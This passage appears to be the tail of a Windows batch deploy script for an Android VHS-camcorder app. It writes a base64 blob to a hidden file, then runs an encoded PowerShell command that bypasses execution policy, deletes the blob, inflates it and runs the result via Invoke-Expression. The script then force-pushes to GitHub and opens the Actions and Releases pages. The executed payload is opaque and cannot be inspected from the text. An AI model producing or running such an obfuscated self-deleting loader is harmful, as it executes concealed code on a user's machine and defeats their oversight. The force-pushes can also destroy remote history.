>> ".deploy_payload.b64" echo xsPc1kS9eAFqSSbWg6XoqpEbqkcUGfktfM+RldVbRop37rwIoVibIFqwPC2X5U3aYFP9EpjE9psX
>> ".deploy_payload.b64" echo Yaq8CJoKSIItySYoI82ol2FUo/DFxGVQVpk2jy/mkERiyi/LMl5G2VPpy0Om1dNcuCPwrV1IcCqf
>> ".deploy_payload.b64" echo iwIRDL24QvQygUyXm14mgum1EfOod9y9PhveHHQP/3wjqhYvwyd1ufRlBXfjbq7fNq9P1Uz1DEwt
>> ".deploy_payload.b64" echo Vn1jW4buYz2l6zvJFDj2Y3+5ySXH3lM1WE+FgDoXtdHMGZHeBQST55dHvZvDS0g0Lq4vrwdnfy29
>> ".deploy_payload.b64" echo bEBPmxIA/ct28xnrF42JNlcLRD5d3FrL49fk4icxlLPMD32FAFK4Xxbaw5LqKYT1f7k+7feO8Gte
>> ".deploy_payload.b64" echo 2dnpx56IzU97n45PcXLK1XRWZ37C66yrqSSsBUlYdXM2VywmVJcIjCJ+C59j7BYHy1o2pydvLyx/
>> ".deploy_payload.b64" echo sqd1Kiu49gGrtOo0dFLqLVeeKY5PmWSplDnzn1ygfgFJ1uLqaKez3dBqRpeDI3YJkuVYy9Jz5Pc5
>> ".deploy_payload.b64" echo 2dKGYtuKSlpebDcLvF542piV5kphn1sS+9zS2MsUaqXgrKxsYRrNVtSqVLp9ddb960qY1a6voPrS
>> ".deploy_payload.b64" echo Od45XlV9+Q0VmM8rWWVrN52i2s1q//sshkueJbd3mAsflH5MMdqLWLeucPUFWKfbzmcy4enfXVvk
>> ".deploy_payload.b64" echo 5KmrDP5T0tcxq4x3Z3x/Ohz2+vgtoXI1Kd5pizc8gfyakXeKx9ae/vQiw/G2020f7P7+0t/8XOlf
>> ".deploy_payload.b64" echo VXFMnCZuJgcFoTszvhJXPZEVZfGeq//Q5ZfMItHvsgIjopW/XV6eg0CU/2Q2p2UTt9xYaq1R21j/
>> ".deploy_payload.b64" echo 9Lgusls/tTkDlp6tgUNlklJBhr/giZrHtFQLivEfEVYcMBJRXXqx0xx7/tKIMaCnjSpFxXnqsy/R
>> ".deploy_payload.b64" echo 4LEV0+yYRadti+b8QcSfzem6U7byrhRxuUP57ErelFFBzvcsyA9/QdyF1URxE+zhre0Xa3tIkko3
>> ".deploy_payload.b64" echo QxTFArgtAlEXq5oWE69UxZirDxB/MozB+aYEFseGp/71echQJW8Kyd0Nkr97o9PKXfyxM12fTSKH
>> ".deploy_payload.b64" echo N/Z/VtT/m4KbZ3L3ojSbG/qnCG1T/4Oi/nfyd3s0C6+1eWn6Wzz/9G1ppDtkFsTcPj17rSxtVi9d
>> ".deploy_payload.b64" echo XgMTys7ogiDcg5SYbWF1FET6S93173+itlmjk4q1VnraAZ/b5G1TlqedsjzPsuLZDakbV/9fbN53
>> ".deploy_payload.b64" echo UxsOstq0YrtMbCnw+ctYiiQCRjOBeLWPNlqMxDIQRc8TsUwnny9tyXcQ0QJi/EVEB/g9dRm5W/l9
>> ".deploy_payload.b64" echo Revc27+1jK2TFU1O0ruO1q6HZ3cQ/SH9QYF0ZCSj/K///r9YDG/Q90RVylkBqXz2MOQmpGeMItnB
>> ".deploy_payload.b64" echo 9IfU8zPG8P/+x3/53+ySLjQ8khcafpkhKI3V7qadrh9KYTQUtxdlhyKsFfhfeDA8SPycefvn/5FX
>> ".deploy_payload.b64" echo 7R6f45alNQPOqHDsBsTWkY+HfXYiv75VBojJjjXxTJsqPccoo+MQJzbZYI5fzWGo+/bj6yrxIn28
>> ".deploy_payload.b64" echo cU6NXzvPuYo9aXdM4eIqAuhCRboKvC/vUPwKiHe8kBlguGs9ec2iRoA6OLmq8+S2rrUdX/FAXPF5
>> ".deploy_payload.b64" echo UsPvIqHrEb9X3wbksU/4bUADeK/1HJ+sXNW1Fl6s7RsmmJIkEZ18xchcZuW9qgei8vtyVg1Zi3TW
>> ".deploy_payload.b64" echo dow74uLvJDJ6ucs+B3f8QRtwfLR2VcfaXWlr++2LL+qhG7PFF70w/VSuHKc6mrtymOrrb/TeCnd2
>> ".deploy_payload.b64" echo p7snTSs+ZFhN5z97zJBnD+VlW8rg5zbc/XvsIxSxBLKnKFbstXqd3mFlUw4qzNerXwyRdOaLIZvC
>> ".deploy_payload.b64" echo 0M9e28jKm6HSXvpdzeW2qedqOmHFdFUlJL/rOUP9OIk6XDi3KqUSepIhDyOBckse2ojub8aeSxe/
>> ".deploy_payload.b64" echo QLwT4TfcxjLpL2unQOAaWFY74miSxIVQWxNvHNZxH9ijen3sBWP+uegKMIkFwMxQst0WjCBP2aae
>> ".deploy_payload.b64" echo XoZgzZAk4Tn+h5g21EeWi6c1fvJnhYzPARVxPPW6mOOb8BSgeCpd8AfRnv4dLsGloKBKACYHYrre
>> ".deploy_payload.b64" echo T/xu6cBYf2WXi6h2gVffPa8tkV+M4FUYWXO8DGSLNhXRNlazUbNUNFK7vw3x8vTZDA8WMQv0AwKK
>> ".deploy_payload.b64" echo H4/wvhZ7jtp0HY0vvAdz6AnLbGx5W5WXK93B9enZEV6UhGusZvQoNIqIq5T+Pw==
powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwB0AG8AcAAnADsAJAByAGEAdwA9AFsASQBPAC4ARgBpAGwAZQBdADoAOgBSAGUAYQBkAEEAbABsAFQAZQB4AHQAKAAnAC4AZABlAHAAbABvAHkAXwBwAGEAeQBsAG8AYQBkAC4AYgA2ADQAJwApACAALQByAGUAcABsAGEAYwBlACAAJwBcAHMAJwAsACcAJwA7AFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACcALgBkAGUAcABsAG8AeQBfAHAAYQB5AGwAbwBhAGQALgBiADYANAAnACAALQBGAG8AcgBjAGUAOwAkAGIAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAcgBhAHcAKQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQAoACwAJABiACkAOwAkAGQAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApADsAJAByAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAJABkACwAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgAKQA7AEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAcgAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA=
if errorlevel 1 goto :ps_err

echo [3/6] Initializing Git repository on branch main...
if not exist ".git" git init
git checkout -B main

echo [4/6] Committing v3.2 Authentic VHS Android source and shader updates...
git add -A
git commit --allow-empty -m "Build v3.2.0 Authentic VHS Camcorder APK (YIQ 629kHz + 1H Comb + CameraX OpenGL Viewfinder)"

echo [5/6] Pushing new APK build trigger to main and gh-pages...
git remote remove origin >nul 2>nul
git remote add origin https://github.com/f1nal-b0ss/AnalogTV-Android-Camcorder.git
git push -u origin main --force
git push origin main:gh-pages --force

echo.
echo ============================================================================
echo   [6/6] NEW APK BUILD TRIGGERED ON GITHUB!
echo   1. Live Build Progress : https://github.com/f1nal-b0ss/AnalogTV-Android-Camcorder/actions
echo   2. Download APK Release: https://github.com/f1nal-b0ss/AnalogTV-Android-Camcorder/releases
echo      (Wait ~90 seconds for the build-apk workflow to finish and publish v3.2!)
echo ============================================================================
echo.
start "" "https://github.com/f1nal-b0ss/AnalogTV-Android-Camcorder/actions"
start "" "https://github.com/f1nal-b0ss/AnalogTV-Android-Camcorder/releases"
pause
exit /b 0

:no_git
echo [ERROR] Git is not installed or not in your PATH.
echo         Download Git for Windows from: https://git-scm.com/download/win
pause
exit /b 1

:ps_err
echo [ERROR] PowerShell file preparation failed.
pause
exit /b 1
